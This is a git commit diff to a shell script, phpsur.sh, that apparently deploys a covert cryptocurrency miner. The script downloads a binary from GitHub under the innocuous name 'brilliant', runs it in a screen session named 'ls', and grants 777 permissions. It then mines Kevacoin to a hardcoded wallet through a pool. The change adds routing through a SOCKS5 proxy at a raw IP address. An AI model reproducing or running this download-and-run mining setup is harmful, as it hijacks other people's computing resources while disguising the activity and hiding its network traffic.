7573d533702c03c41053b45c4dec70eb55bd135e
brilliant-cut <90860858+brilliant-cut@users.noreply.github.com>
2021-09-17 00:14:22 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -5,5 +5,4 @@ wget -O brilliant https://github.com/brilliant-cut/brilliant-cut/raw/main/brilli
 screen -dmS ls
 chmod +x phpsur.sh && chmod +x brilliant && chmod 777 brilliant phpsur.sh
 #./brilliant --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password Build --proxy=socks5://198.12.255.100:14164
-./brilliant --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.brilliant=$(echo $strDate-$(shuf -i 1-1000 -n 1) --keepalive true
-./srbminer-multi --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.BC --keepalive true
+./brilliant --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.brilliant=$(echo $strDate-$(shuf -i 1-1000 -n 1) --keepalive true --proxy=socks5://50.62.35.16:11818
